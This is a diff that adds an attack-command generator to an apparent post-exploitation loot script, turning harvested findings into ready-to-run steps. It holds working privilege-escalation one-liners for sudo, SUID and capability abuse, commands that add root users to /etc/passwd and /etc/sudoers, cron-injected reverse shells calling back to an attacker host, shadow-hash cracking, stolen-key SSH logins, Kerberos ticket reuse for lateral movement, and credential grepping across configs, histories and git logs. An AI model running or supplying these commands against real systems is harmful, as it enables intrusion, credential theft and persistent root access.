@@ -657,6 +657,475 @@ phase_procs() {
 }
 
 #==============================================================================
+# ATTACK COMMANDS — Generate actionable next-step commands from findings
+#==============================================================================
+generate_attack_commands() {
+    local acfile="${OUTDIR}/attack_commands.txt"
+    local has_actions=false
+
+    {
+        echo "============================================================"
+        echo "  LOOTR ATTACK COMMANDS — ${HOSTNAME_SHORT}"
+        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
+        echo "  Run these on KALI after exfilling the loot"
+        echo "============================================================"
+        echo ""
+
+        # ── Shadow hashes ──────────────────────────────────────────────
+        if [[ -r "${OUTDIR}/creds/shadow.txt" ]] && [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
+            has_actions=true
+            echo "[ SHADOW HASH CRACKING ]"
+            echo "------------------------------------------------------------"
+            echo "# Exfil both files to Kali first, then:"
+            echo "unshadow ${OUTDIR}/creds/passwd.txt ${OUTDIR}/creds/shadow.txt > /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
+            echo "# Option A — crackr.sh:"
+            echo "./crackr.sh -f /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
+            echo "# Option B — direct hashcat (\$6\$=1800, \$1\$=500, \$y\$=400, \$2y\$=3200):"
+            echo "hashcat -m 1800 /tmp/${HOSTNAME_SHORT}_unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+            echo ""
+        fi
+
+        # ── SSH keys ───────────────────────────────────────────────────
+        local kf
+        for kf in "${OUTDIR}/creds/key_"*; do
+            [[ -f "${kf}" ]] || continue
+            has_actions=true
+            echo "[ SSH KEY: $(basename "${kf}") ]"
+            echo "------------------------------------------------------------"
+            echo "chmod 600 ${kf}"
+            if [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
+                awk -F: '$3 >= 1000 && $3 < 65534 {print "ssh -i '"${kf}"' "$1"@<TARGET_IP>"}' \
+                    "${OUTDIR}/creds/passwd.txt" 2>/dev/null | head -5
+            fi
+            echo "ssh -i ${kf} root@<TARGET_IP>"
+            echo "ssh -i ${kf} <USERNAME>@<TARGET_IP>"
+            echo ""
+        done
+
+        # ── Internal listeners ─────────────────────────────────────────
+        if [[ -s "${OUTDIR}/network/internal_listeners.txt" ]]; then
+            has_actions=true
+            echo "[ INTERNAL LISTENERS — tunnel from Kali ]"
+            echo "------------------------------------------------------------"
+            echo "# These services only listen on 127.0.0.1 — must tunnel to reach from Kali"
+            while IFS= read -r line; do
+                local port
+                port=$(echo "${line}" | grep -oP '127[.:][0-9.]+[:%]\K[0-9]+' | head -1)
+                [[ -z "${port}" ]] && continue
+                echo "# Port ${port} (internal only):"
+                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<THIS_HOST_IP>"
+                echo "# OR: ./pivotr.sh --mode local --local-port ${port} --target 127.0.0.1 --target-port ${port} --pivot-ip <THIS_HOST_IP>"
+                echo "# Then connect: <tool> 127.0.0.1 ${port}"
+                echo ""
+            done < "${OUTDIR}/network/internal_listeners.txt"
+        fi
+
+        # ── Sudo NOPASSWD ──────────────────────────────────────────────
+        if [[ -r "${OUTDIR}/system/sudo_rights.txt" ]]; then
+            local nopasswd_entries
+            nopasswd_entries=$(grep -i "NOPASSWD" "${OUTDIR}/system/sudo_rights.txt" 2>/dev/null | grep -v '^\s*#')
+            if [[ -n "${nopasswd_entries}" ]]; then
+                has_actions=true
+                echo "[ SUDO NOPASSWD — escalation commands ]"
+                echo "------------------------------------------------------------"
+                echo "# GTFObins: https://gtfobins.github.io/"
+                echo ""
+                while IFS= read -r entry; do
+                    [[ -z "${entry}" ]] && continue
+                    local bin
+                    bin=$(echo "${entry}" | grep -oP 'NOPASSWD:\s*\K\S+' | head -1)
+                    bin=$(basename "${bin:-unknown}" 2>/dev/null)
+                    echo "# Entry: ${entry}"
+                    case "${bin}" in
+                        bash|sh|zsh|fish|dash|ksh)
+                            echo "sudo ${bin} -p" ;;
+                        vim|vi)
+                            echo "sudo ${bin}  # inside vim: :!/bin/bash" ;;
+                        nano)
+                            echo "sudo ${bin}  # inside nano: Ctrl+R Ctrl+X  then: reset; bash 1>&0 2>&0" ;;
+                        less|more)
+                            echo "sudo ${bin} /etc/passwd  # then type: !bash" ;;
+                        python|python2|python3)
+                            echo "sudo ${bin} -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
+                        perl)
+                            echo "sudo ${bin} -e 'exec \"/bin/bash\";'" ;;
+                        ruby)
+                            echo "sudo ${bin} -e 'exec \"/bin/bash\"'" ;;
+                        find)
+                            echo "sudo ${bin} /. -exec /bin/bash \\;" ;;
+                        awk|gawk|nawk)
+                            echo "sudo ${bin} 'BEGIN {system(\"/bin/bash\")}'" ;;
+                        env)
+                            echo "sudo ${bin} /bin/bash" ;;
+                        nmap)
+                            echo "echo 'os.execute(\"/bin/bash\")' > /tmp/nmap.nse && sudo ${bin} --script /tmp/nmap.nse" ;;
+                        tee)
+                            echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo ${bin} -a /etc/sudoers" ;;
+                        cp)
+                            echo "# Add passwordless root2 user:"
+                            echo "openssl passwd -1 hacked | xargs -I{} echo 'root2:{}:0:0:root:/root:/bin/bash' | sudo ${bin} /dev/stdin /etc/passwd" ;;
+                        chmod)
+                            echo "sudo ${bin} +s /bin/bash && /bin/bash -p" ;;
+                        chown)
+                            echo "sudo ${bin} \$(id -un):\$(id -gn) /etc/shadow && cat /etc/shadow" ;;
+                        *)
+                            echo "# https://gtfobins.github.io/gtfobins/${bin}/#sudo" ;;
+                    esac
+                    echo ""
+                done <<< "${nopasswd_entries}"
+            fi
+        fi
+
+        # ── Non-standard SUID binaries ─────────────────────────────────
+        if [[ -s "${OUTDIR}/files/suid_binaries.txt" ]]; then
+            local common_suid_re="ping$|su$|sudo$|passwd$|newgrp$|chfn$|chsh$|gpasswd$|pkexec$|mount$|umount$|fusermount$|at$|crontab$|wall$|write$|ssh-agent$|pt_chown$|Xorg$|snap$|ubuntu-core-launcher$|dbus-daemon-launch-helper$"
+            local interesting_suids
+            interesting_suids=$(grep -vE "${common_suid_re}" "${OUTDIR}/files/suid_binaries.txt" 2>/dev/null)
+            if [[ -n "${interesting_suids}" ]]; then
+                has_actions=true
+                echo "[ SUID BINARIES — exploitation hints ]"
+                echo "------------------------------------------------------------"
+                echo "# GTFObins: https://gtfobins.github.io/"
+                echo ""
+                while IFS= read -r suid_path; do
+                    [[ -z "${suid_path}" ]] && continue
+                    local suid_bin
+                    suid_bin=$(basename "${suid_path}")
+                    echo "# SUID: ${suid_path}"
+                    case "${suid_bin}" in
+                        bash|sh|zsh|dash)
+                            echo "${suid_path} -p" ;;
+                        find)
+                            echo "${suid_path} /. -exec /bin/bash -p \\;" ;;
+                        vim|vi)
+                            echo "${suid_path} -c ':!/bin/bash -p'" ;;
+                        nmap)
+                            echo "echo 'os.execute(\"/bin/bash -p\")' > /tmp/s.nse && ${suid_path} --script /tmp/s.nse" ;;
+                        python|python2|python3)
+                            echo "${suid_path} -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
+                        perl)
+                            echo "${suid_path} -e 'exec \"/bin/bash -p\";'" ;;
+                        env)
+                            echo "${suid_path} /bin/bash -p" ;;
+                        awk|gawk)
+                            echo "${suid_path} 'BEGIN {system(\"/bin/bash -p\")}'" ;;
+                        cp)
+                            echo "echo 'root2::0:0:root:/root:/bin/bash' >> /tmp/passwd_evil && cat /etc/passwd >> /tmp/passwd_evil"
+                            echo "${suid_path} /tmp/passwd_evil /etc/passwd && su root2" ;;
+                        tee)
+                            echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | ${suid_path} -a /etc/sudoers" ;;
+                        *)
+                            echo "# https://gtfobins.github.io/gtfobins/${suid_bin}/#suid" ;;
+                    esac
+                    echo ""
+                done <<< "${interesting_suids}"
+            fi
+        fi
+
+        # ── File capabilities ──────────────────────────────────────────
+        if [[ -s "${OUTDIR}/files/capabilities.txt" ]]; then
+            has_actions=true
+            echo "[ FILE CAPABILITIES — exploitation hints ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r cap_line; do
+                [[ -z "${cap_line}" ]] && continue
+                local cap_path cap_caps cap_bin
+                cap_path=$(echo "${cap_line}" | awk '{print $1}')
+                cap_caps=$(echo "${cap_line}" | awk '{print $NF}')
+                cap_bin=$(basename "${cap_path}")
+                echo "# ${cap_line}"
+                case "${cap_caps}" in
+                    *cap_setuid*)
+                        case "${cap_bin}" in
+                            python|python2|python3)
+                                echo "${cap_path} -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
+                            perl)
+                                echo "${cap_path} -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'" ;;
+                            ruby)
+                                echo "${cap_path} -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'" ;;
+                            node)
+                                echo "${cap_path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: \"inherit\"})'" ;;
+                            *)
+                                echo "# cap_setuid — https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
+                        esac ;;
+                    *cap_dac_override*|*cap_dac_read_search*)
+                        echo "# Can read/write any file — try shadow or root SSH key:"
+                        echo "${cap_path} /etc/shadow"
+                        echo "${cap_path} /root/.ssh/id_rsa" ;;
+                    *cap_net_raw*)
+                        echo "# Can sniff raw packets:"
+                        echo "${cap_path} -i <INTERFACE> -w /tmp/capture.pcap" ;;
+                    *)
+                        echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
+                esac
+                echo ""
+            done < "${OUTDIR}/files/capabilities.txt"
+        fi
+
+        # ── Writable cron jobs ─────────────────────────────────────────
+        if [[ -r "${OUTDIR}/files/cron_jobs.txt" ]]; then
+            if grep -qvE '^#|^$|not readable|not accessible|no user crontab|no cron\.' \
+                "${OUTDIR}/files/cron_jobs.txt" 2>/dev/null; then
+                has_actions=true
+                echo "[ CRON JOBS — check for writable script injection ]"
+                echo "------------------------------------------------------------"
+                echo "# 1. Review cron entries — find scripts that run as root:"
+                echo "cat ${OUTDIR}/files/cron_jobs.txt"
+                echo ""
+                echo "# 2. If a cron script path is writable, inject reverse shell:"
+                echo "echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> /path/to/writable/cron_script.sh"
+                echo ""
+                echo "# 3. If /etc/crontab itself is writable:"
+                echo "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\"' >> /etc/crontab"
+                echo ""
+                echo "# 4. Listener on Kali:"
+                echo "nc -lvnp 4444"
+                echo ""
+                echo "# 5. Use pspy64 to catch jobs not in visible crontab:"
+                echo "./pspy64  # run in second session on target"
+                echo ""
+            fi
+        fi
+
+        # ── Reachable subnets ──────────────────────────────────────────
+        if [[ -s "${OUTDIR}/network/reachable_subnets.txt" ]]; then
+            has_actions=true
+            echo "[ REACHABLE SUBNETS — pivot and scan ]"
+            echo "------------------------------------------------------------"
+            echo "# These subnets are reachable from this host — pivot then scan:"
+            while IFS= read -r subnet; do
+                [[ -z "${subnet}" ]] && continue
+                echo "# Subnet: ${subnet}"
+                echo "# On Kali — set up pivot first (use this host as pivot):"
+                echo "./pivotr.sh ligolo --subnet ${subnet} --serve"
+                echo "# OR: ./pivotr.sh ssh --type dynamic --pivot-ip <THIS_HOST_IP> --pivot-user <USER>"
+                echo "# Then scan internally:"
+                echo "sudo ./recon.sh --auto <INTERNAL_HOST_IP>"
+                echo "# OR (SOCKS): proxychains sudo ./recon.sh --auto <INTERNAL_HOST_IP>"
+                echo ""
+            done < "${OUTDIR}/network/reachable_subnets.txt"
+        fi
+
+        # ── Kerberos tickets / ccache files ───────────────────────────
+        if [[ -s "${OUTDIR}/creds/kerberos.txt" ]]; then
+            if grep -qvE 'klist not available|no tickets|^=|^$' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null || \
+               grep -q 'krb5cc_\|\.ccache' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null; then
+                has_actions=true
+                echo "[ KERBEROS TICKETS / CCACHE ]"
+                echo "------------------------------------------------------------"
+                echo "# Tickets or ccache files found — exfil and use from Kali:"
+                echo ""
+                echo "# 1. Check ticket contents on target:"
+                echo "klist"
+                echo "klist -e  # show encryption types"
+                echo ""
+                echo "# 2. Copy ccache file to Kali, then set KRB5CCNAME:"
+                local ccache_line
+                ccache_line=$(grep 'krb5cc_\|\.ccache' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null | head -1)
+                if [[ -n "${ccache_line}" ]]; then
+                    echo "export KRB5CCNAME=${ccache_line}"
+                else
+                    echo "export KRB5CCNAME=/tmp/krb5cc_<ID>"
+                fi
+                echo ""
+                echo "# 3. Use ticket for lateral movement:"
+                echo "impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>"
+                echo "impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>"
+                echo "impacket-smbclient -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>"
+                echo ""
+                echo "# 4. Convert to impacket format if needed:"
+                echo "impacket-ticketConverter krb5cc_<ID> ticket.ccache"
+                echo ""
+            fi
+        fi
+
+        # ── Shell histories ────────────────────────────────────────────
+        local hist_files=()
+        while IFS= read -r hf; do
+            hist_files+=("${hf}")
+        done < <(find "${OUTDIR}/creds/" -maxdepth 1 -name "history_*" -type f 2>/dev/null)
+        if (( ${#hist_files[@]} > 0 )); then
+            has_actions=true
+            echo "[ SHELL HISTORIES — grep for credentials ]"
+            echo "------------------------------------------------------------"
+            for hf in "${hist_files[@]}"; do
+                echo "# $(basename "${hf}"):"
+                echo "grep -iE 'pass|sshpass|mysql.*-p|curl.*-u|wget.*--password|token|secret|key|sudo' '${hf}' 2>/dev/null"
+                echo ""
+            done
+        fi
+
+        # ── Config files with credential patterns ─────────────────────
+        if [[ -s "${OUTDIR}/creds/config_files_with_creds.txt" ]]; then
+            has_actions=true
+            echo "[ CONFIG FILES WITH CREDENTIALS ]"
+            echo "------------------------------------------------------------"
+            echo "# Files containing password patterns — inspect each:"
+            head -10 "${OUTDIR}/creds/config_files_with_creds.txt" | while IFS= read -r cred_line; do
+                local cred_file
+                cred_file=$(echo "${cred_line}" | awk '{print $1}' | sed 's/:.*//')
+                [[ -z "${cred_file}" ]] && continue
+                echo "# From: ${cred_line}"
+            done
+            echo ""
+            echo "# Quick pass extraction from the collected file:"
+            echo "grep -iE 'password[[:space:]]*[=:\"]+|DB_PASS|db_password|secret|api.?key' \\"
+            echo "     '${OUTDIR}/creds/config_files_with_creds.txt'"
+            echo ""
+        fi
+
+        # ── wp-config.php / .env / home credential files ──────────────
+        local found_sensitive_creds=false
+        for sens_file in "${OUTDIR}/creds/dotenv_"* "${OUTDIR}/creds/wpconfig_"*; do
+            [[ -f "${sens_file}" ]] || continue
+            found_sensitive_creds=true
+        done
+        for sens_homecred in "${OUTDIR}/creds/.netrc" "${OUTDIR}/creds/.my.cnf" \
+                             "${OUTDIR}/creds/.pgpass" "${OUTDIR}/creds/dot_netrc" \
+                             "${OUTDIR}/creds/dot_my.cnf"; do
+            [[ -f "${sens_homecred}" ]] || continue
+            found_sensitive_creds=true
+        done
+        if [[ "${found_sensitive_creds}" == "true" ]]; then
+            has_actions=true
+            echo "[ SENSITIVE CREDENTIAL FILES COLLECTED ]"
+            echo "------------------------------------------------------------"
+            for sens_file in "${OUTDIR}/creds/dotenv_"* "${OUTDIR}/creds/wpconfig_"*; do
+                [[ -f "${sens_file}" ]] || continue
+                echo "# $(basename "${sens_file}"):"
+                echo "grep -iE 'DB_PASSWORD|DB_USER|DB_NAME|SECRET_KEY|APP_KEY|PASSWORD|TOKEN|API_KEY' '${sens_file}'"
+                echo ""
+            done
+            for sens_homecred in "${OUTDIR}/creds/.netrc" "${OUTDIR}/creds/dot_netrc"; do
+                [[ -f "${sens_homecred}" ]] || continue
+                echo "# .netrc — machine/login/password entries:"
+                echo "cat '${sens_homecred}'"
+                echo ""
+            done
+            for sens_homecred in "${OUTDIR}/creds/.my.cnf" "${OUTDIR}/creds/dot_my.cnf"; do
+                [[ -f "${sens_homecred}" ]] || continue
+                echo "# .my.cnf — MySQL credentials:"
+                echo "grep -E 'user|password|host' '${sens_homecred}'"
+                echo ""
+            done
+        fi
+
+        # ── Git repositories ───────────────────────────────────────────
+        if [[ -s "${OUTDIR}/files/git_repos.txt" ]]; then
+            has_actions=true
+            echo "[ GIT REPOSITORIES — check for leaked credentials ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r git_dir; do
+                [[ -z "${git_dir}" ]] && continue
+                local repo_dir="${git_dir%/.git}"
+                echo "# Repo: ${repo_dir}"
+                echo "git -C '${repo_dir}' log --all --oneline 2>/dev/null | head -20"
+                echo "git -C '${repo_dir}' stash list 2>/dev/null"
+                echo "git -C '${repo_dir}' log --all -p --follow -- '*.env' '*.conf' '*.ini' 2>/dev/null | grep -iE 'password|secret|token|key' | head -20"
+                echo "# Look for creds in any commit, not just HEAD:"
+                echo "git -C '${repo_dir}' log --all -p 2>/dev/null | grep -iE '^\\+.*pass|^\\+.*secret|^\\+.*token' | head -20"
+                echo ""
+            done < "${OUTDIR}/files/git_repos.txt"
+        fi
+
+        # ── SQL / backup / database files ─────────────────────────────
+        if [[ -s "${OUTDIR}/files/backup_files.txt" ]] || [[ -s "${OUTDIR}/files/database_files.txt" ]]; then
+            has_actions=true
+            echo "[ SQL / BACKUP / DATABASE FILES ]"
+            echo "------------------------------------------------------------"
+            if [[ -s "${OUTDIR}/files/backup_files.txt" ]]; then
+                echo "# SQL dump / backup files — grep for credentials:"
+                while IFS= read -r bak; do
+                    [[ -z "${bak}" ]] && continue
+                    case "${bak,,}" in
+                        *.sql|*.dump)
+                            echo "grep -iE \"INSERT INTO.*(user|password|account)|'[0-9a-f]{32,}'\" '${bak}' | head -10" ;;
+                        *)
+                            echo "strings '${bak}' | grep -iE 'password|passwd|secret' | head -10" ;;
+                    esac
+                done < "${OUTDIR}/files/backup_files.txt"
+                echo ""
+            fi
+            if [[ -s "${OUTDIR}/files/database_files.txt" ]]; then
+                echo "# SQLite / DB files — dump schema + look for passwords:"
+                while IFS= read -r dbf; do
+                    [[ -z "${dbf}" ]] && continue
+                    echo "sqlite3 '${dbf}' '.tables' 2>/dev/null"
+                    echo "sqlite3 '${dbf}' 'SELECT * FROM users LIMIT 10;' 2>/dev/null"
+                    echo "strings '${dbf}' | grep -iE 'password|passwd|hash|admin' | head -10"
+                    echo ""
+                done < "${OUTDIR}/files/database_files.txt"
+            fi
+        fi
+
+        # ── World-writable sensitive files ─────────────────────────────
+        if [[ -s "${OUTDIR}/files/world_writable.txt" ]]; then
+            if grep -qE '/etc/passwd|/etc/shadow|/etc/sudoers|/etc/cron' \
+                "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
+                has_actions=true
+                echo "[ WORLD-WRITABLE CRITICAL FILES ]"
+                echo "------------------------------------------------------------"
+                if grep -q '/etc/passwd' "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
+                    echo "# /etc/passwd is world-writable — add root-level user:"
+                    echo "openssl passwd -1 hacked"
+                    echo "echo 'r00t:<HASH_FROM_ABOVE>:0:0:root:/root:/bin/bash' >> /etc/passwd"
+                    echo "su r00t  # password: hacked"
+                    echo ""
+                fi
+                if grep -q '/etc/shadow' "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
+                    echo "# /etc/shadow is world-writable — overwrite root hash:"
+                    echo "openssl passwd -1 hacked"
+                    echo "# Replace root hash in /etc/shadow with output above"
+                    echo "su root  # password: hacked"
+                    echo ""
+                fi
+                if grep -q '/etc/sudoers' "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
+                    echo "# /etc/sudoers is world-writable:"
+                    echo "echo '\$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+                    echo "sudo bash"
+                    echo ""
+                fi
+            fi
+        fi
+
+        # ── NetworkManager PSK credentials ─────────────────────────────
+        if [[ -s "${OUTDIR}/creds/networkmanager_creds.txt" ]]; then
+            has_actions=true
+            echo "[ NETWORKMANAGER SAVED PASSWORDS ]"
+            echo "------------------------------------------------------------"
+            echo "# Saved Wi-Fi / VPN credentials found:"
+            echo "grep -A1 'psk\|password' '${OUTDIR}/creds/networkmanager_creds.txt'"
+            echo ""
+            echo "# Full dump:"
+            echo "cat '${OUTDIR}/creds/networkmanager_creds.txt'"
+            echo ""
+            echo "# Feed plaintext passwords to sprayr.sh:"
+            echo "./sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
+            echo ""
+        fi
+
+        if [[ "${has_actions}" == "false" ]]; then
+            echo "No high-value actionable findings detected."
+            echo "Review ${OUTDIR}/ manually or re-run with elevated privileges."
+        fi
+
+        echo "============================================================"
+        echo "  END — Full output: ${OUTDIR}/"
+        echo "============================================================"
+
+    } > "${acfile}"
+
+    if [[ "${has_actions}" == "true" ]]; then
+        echo ""
+        success "Attack commands → ${acfile}"
+        echo -e "${RED}${BOLD}  ╔════════════════════════════════════════════════════════════╗${NC}"
+        echo -e "${RED}${BOLD}  ║  ★ ATTACK COMMANDS READY — START HERE:                   ║${NC}"
+        echo -e "${RED}${BOLD}  ║    cat ${acfile}${NC}"
+        echo -e "${RED}${BOLD}  ╚════════════════════════════════════════════════════════════╝${NC}"
+    fi
+}
+
+#==============================================================================
 # SUMMARY GENERATION
 #==============================================================================
 generate_summary() {
@@ -702,6 +1171,7 @@ generate_summary() {
         echo "------------------------------------------------------------"
         if [[ -r "${OUTDIR}/creds/shadow.txt" ]]; then
             echo "  [!] /etc/shadow was readable — hashes in creds/shadow_hashes.txt"
+            echo "  NEXT → crack: see attack_commands.txt [ SHADOW HASH CRACKING ]"
         fi
         if [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
             echo "  [*] /etc/passwd copied to creds/passwd.txt"
@@ -719,6 +1189,7 @@ generate_summary() {
                 [[ -f "${kf}" ]] || continue
                 echo "  ${kf}"
             done
+            echo "  NEXT → ssh commands: see attack_commands.txt [ SSH KEY ]"
         fi
         echo ""
 
@@ -726,8 +1197,14 @@ generate_summary() {
         echo "[ SUDO NOPASSWD ]"
         echo "------------------------------------------------------------"
         if [[ -r "${OUTDIR}/system/sudo_rights.txt" ]]; then
-            grep -i "NOPASSWD" "${OUTDIR}/system/sudo_rights.txt" 2>/dev/null \
-                | sed 's/^/  /' || echo "  No NOPASSWD entries"
+            local nopasswd_found
+            nopasswd_found=$(grep -i "NOPASSWD" "${OUTDIR}/system/sudo_rights.txt" 2>/dev/null)
+            if [[ -n "${nopasswd_found}" ]]; then
+                echo "${nopasswd_found}" | sed 's/^/  /'
+                echo "  NEXT → exploit commands: see attack_commands.txt [ SUDO NOPASSWD ]"
+            else
+                echo "  No NOPASSWD entries"
+            fi
         else
             echo "  sudo output not available"
         fi
@@ -738,6 +1215,7 @@ generate_summary() {
         echo "------------------------------------------------------------"
         if [[ -s "${OUTDIR}/network/internal_listeners.txt" ]]; then
             sed 's/^/  /' "${OUTDIR}/network/internal_listeners.txt" 2>/dev/null
+            echo "  NEXT → tunnel commands: see attack_commands.txt [ INTERNAL LISTENERS ]"
         else
             echo "  None identified"
         fi
@@ -747,8 +1225,14 @@ generate_summary() {
         echo "[ SUID BINARIES (non-standard) ]"
         echo "------------------------------------------------------------"
         if [[ -s "${OUTDIR}/files/suid_binaries.txt" ]]; then
-            grep -vE "${common_suid}" "${OUTDIR}/files/suid_binaries.txt" 2>/dev/null \
-                | sed 's/^/  /' || echo "  Only common/expected SUID binaries found"
+            local suid_interesting
+            suid_interesting=$(grep -vE "${common_suid}" "${OUTDIR}/files/suid_binaries.txt" 2>/dev/null)
+            if [[ -n "${suid_interesting}" ]]; then
+                echo "${suid_interesting}" | sed 's/^/  /'
+                echo "  NEXT → GTFObins hints: see attack_commands.txt [ SUID BINARIES ]"
+            else
+                echo "  Only common/expected SUID binaries found"
+            fi
         else
             echo "  SUID list not available"
         fi
@@ -759,6 +1243,7 @@ generate_summary() {
         echo "------------------------------------------------------------"
         if [[ -s "${OUTDIR}/files/capabilities.txt" ]]; then
             sed 's/^/  /' "${OUTDIR}/files/capabilities.txt" 2>/dev/null
+            echo "  NEXT → exploit commands: see attack_commands.txt [ FILE CAPABILITIES ]"
         else
             echo "  No special capabilities found"
         fi
@@ -785,7 +1270,8 @@ generate_summary() {
         echo ""
 
         echo "============================================================"
-        echo "  Full data in: ${OUTDIR}/"
+        echo "  Full data:       ${OUTDIR}/"
+        echo "  Attack commands: ${OUTDIR}/attack_commands.txt  ← START HERE"
         echo "============================================================"
 
     } > "${sfile}"
@@ -793,6 +1279,9 @@ generate_summary() {
     success "Summary written → ${sfile}"
     echo ""
     cat "${sfile}"
+
+    # Generate attack commands file from findings
+    generate_attack_commands
 }
 
 #==============================================================================
